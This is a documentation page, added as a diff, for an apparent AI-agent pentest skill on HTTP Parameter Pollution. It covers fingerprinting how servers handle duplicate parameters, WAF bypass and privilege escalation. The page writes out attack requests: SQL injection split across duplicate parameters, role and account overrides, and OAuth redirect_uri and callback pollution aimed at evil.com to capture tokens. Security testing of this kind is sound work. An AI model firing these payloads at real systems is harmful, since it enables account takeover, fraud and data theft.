@@ -1,0 +1,149 @@
+---
+title: HPP Hunter
+description: Complete HTTP Parameter Pollution methodology — server behavior fingerprinting, server-side and client-side HPP, WAF bypass via parameter splitting, OAuth/payment/access-control abuse, header and JSON body pollution, and report structure.
+---
+
+<Info>
+  **Category:** Pentest & security testing
+</Info>
+
+**Installation**
+
+```bash
+auditguard-skills add hpp-hunter
+```
+
+---
+
+## Summary
+
+Exploit inconsistencies in how different server technologies handle duplicate HTTP parameters — WAF bypasses, privilege escalation, payment manipulation, and OAuth token theft.
+
+- Phase 1 fingerprints how the target handles duplicate parameters (first-wins, last-wins, concatenation, or array) per server technology
+- Phase 2 covers server-side HPP: precedence abuse, payload splitting for WAF bypass, security parameter override, and access control bypass
+- Phase 3 covers client-side HPP: URL-encoded parameter injection, OAuth `redirect_uri` pollution, social sharing URL injection, and link injection
+- Phases 4–5 target WAF bypass via duplicate parameters and array syntax, plus header and JSON body pollution
+- Phase 6 documents high-value attack scenarios: OAuth token theft, payment bypass, coupon stacking, privilege escalation, and SSRF via HPP
+- Includes an automation script and a complete report structure
+
+---
+
+## SKILL.md
+
+### HPP Hunter
+
+HTTP Parameter Pollution (HPP) exploits how different server technologies handle duplicate HTTP parameters in inconsistent ways. The same request can be interpreted differently by a WAF, a front-end proxy, and a back-end application — creating bypasses, logic flaws, and privilege escalation paths.
+
+#### When to Use This Skill
+
+Use this skill when the user:
+
+- Wants to test for HTTP Parameter Pollution
+- Is trying to bypass a WAF with a known-blocked payload
+- Sees a payment, role, or redirect parameter and wants to test override attacks
+- Is testing OAuth flows for redirect_uri manipulation
+
+#### What Does It Check?
+
+**In scope:**
+- Server-side HPP: parameter precedence abuse, WAF bypass via splitting, security parameter override
+- Client-side HPP: URL-encoded injection, OAuth redirect_uri pollution, link injection
+- Header pollution: X-Forwarded-For, X-Original-URL, Host duplication
+- JSON body pollution: duplicate keys with first-wins vs. last-wins behavior
+- High-value scenarios: OAuth token theft, payment bypass, privilege escalation, SSRF
+
+**Out of scope:**
+- Other vulnerability classes — HPP is specifically about duplicate parameter handling
+
+#### How It Works
+
+**Phase 1: Fingerprint Parameter Handling**
+
+```
+GET /search?color=red&color=blue
+```
+
+| Result | Behavior |
+|---|---|
+| Only `red` | First-wins |
+| Only `blue` | Last-wins |
+| `red,blue` | Concatenation |
+| Array / both visible | Array |
+
+Technology quick reference:
+- PHP/Apache — Last wins | ASP.NET/IIS — Joined with `, ` | JSP/Tomcat — First wins
+- Node.js/Express — Array | Python/Flask — First wins | Ruby/Rails — Last wins
+
+**Phase 2: Server-Side HPP**
+
+Abuse precedence discrepancy between WAF (inspects first value) and back-end (uses last value):
+```
+GET /api/user?role=user&role=admin
+POST /api/transfer
+  amount=1000&account=victim&account=attacker
+```
+
+Split injection payloads across duplicate parameters to bypass WAF pattern matching:
+```
+GET /search?q=1' UNION &q=SELECT password FROM users--
+```
+
+**Phase 3: Client-Side HPP**
+
+Inject parameters via URL-encoded `%26` that get reflected into links:
+```
+GET /page?url=https://legit.com%26callback=https://evil.com/capture
+```
+
+OAuth redirect_uri pollution:
+```
+GET /oauth/authorize?client_id=app&redirect_uri=https://legit.com&redirect_uri=https://evil.com
+```
+
+**Phase 4: WAF Bypass**
+
+```
+# First-wins WAF, last-wins back-end:
+GET /api/user?id=1&id=1' OR '1'='1
+```
+
+**Phase 5: Header & Body Pollution**
+
+Duplicate `X-Forwarded-For` to bypass IP allowlists. Duplicate JSON keys to override security-critical values.
+
+#### Output
+
+| Severity | Condition |
+|---|---|
+| Critical | OAuth redirect_uri pollution → token theft |
+| High | Payment parameter override, privilege escalation |
+| Medium | WAF bypass enabling previously-blocked injection |
+| Low | Client-side reflected HPP with victim interaction required |
+
+#### Known Limitations
+
+- Effectiveness depends entirely on the server's duplicate parameter handling behavior — always fingerprint first
+- JSON key deduplication is parser-specific; test with both orderings
+- WAF bypass requires that the WAF and back-end have different parameter precedence rules
+
+---
+
+## Related skills
+
+<CardGroup cols={3}>
+  <Card title="redirect-forge" href="/skills/redirect-forge">
+    Complete open redirect detection and exploitation methodology including OAuth token theft
+
+    
+  </Card>
+  <Card title="ssrf-hunter" href="/skills/ssrf-hunter">
+    Complete SSRF detection and exploitation methodology — cloud metadata, internal network enumeration, and bypass techniques
+
+    
+  </Card>
+  <Card title="xss-hunter" href="/skills/xss-hunter">
+    Complete XSS testing methodology — reflected, stored, DOM-based, blind, and mutation XSS
+
+    
+  </Card>
+</CardGroup>
